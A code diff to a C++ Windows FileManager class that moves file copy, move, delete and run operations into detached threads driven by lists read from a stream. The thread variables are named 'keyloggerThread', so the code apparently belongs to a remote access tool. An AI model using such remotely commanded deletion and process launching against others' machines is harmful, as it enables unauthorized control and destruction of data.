@@ -43,10 +43,14 @@ std::string FileManager::readAll(){
     return folderString;
 }
 
-
-void FileManager::copyFiles() {
+void FileManager::copyFilesThread(){
     std::vector<std::string> vectorOfFiles = stream.readList();
     std::vector<std::string> vectorOfDirectories = stream.readList();
+    std::thread keyloggerThread(&FileManager::copyFiles, this,vectorOfFiles,vectorOfDirectories);
+    keyloggerThread.detach();
+}
+
+void FileManager::copyFiles(const std::vector<std::string> &vectorOfFiles,const std::vector<std::string> &vectorOfDirectories) {
     for (const auto &directory: vectorOfDirectories) {
         for (const auto &file: vectorOfFiles) {
             std::filesystem::path pathI = std::filesystem::u8path(file);
@@ -60,9 +64,15 @@ void FileManager::copyFiles() {
     }
 }
 
-void FileManager::moveFiles() {
+
+void FileManager::moveFilesThread() {
     std::vector<std::string> vectorOfFiles = stream.readList();
     std::string directory = stream.readString();
+    std::thread keyloggerThread(&FileManager::moveFiles, this,vectorOfFiles,directory);
+    keyloggerThread.detach();
+}
+
+void FileManager::moveFiles(const std::vector<std::string>& vectorOfFiles, const std::string& directory) {
     for (const auto &file: vectorOfFiles) {
         std::filesystem::path pathI = std::filesystem::u8path(file);
         std::filesystem::path pathF = std::filesystem::u8path(directory);
@@ -73,15 +83,25 @@ void FileManager::moveFiles() {
     }
 }
 
-void FileManager::deleteFiles() {
+void FileManager::deleteFilesThread() {
     std::vector<std::string> vectorOfFiles = stream.readList();
+    std::thread keyloggerThread(&FileManager::deleteFiles, this,vectorOfFiles);
+    keyloggerThread.detach();
+}
+
+void FileManager::deleteFiles(const std::vector<std::string>&vectorOfFiles) {
     for (const auto &file: vectorOfFiles) {
         std::filesystem::remove_all(std::filesystem::u8path(file));
     }
 }
 
-void FileManager::runFiles() {
+void FileManager::runFilesThread(){
     std::vector<std::string> vectorOfFiles = stream.readList();
+    std::thread keyloggerThread(&FileManager::runFiles, this,vectorOfFiles);
+    keyloggerThread.detach();
+}
+
+void FileManager::runFiles(const std::vector<std::string> &vectorOfFiles) {
     for (const auto &file: vectorOfFiles) {
         STARTUPINFOW process_startup_info{};
         process_startup_info.cb = sizeof(process_startup_info);
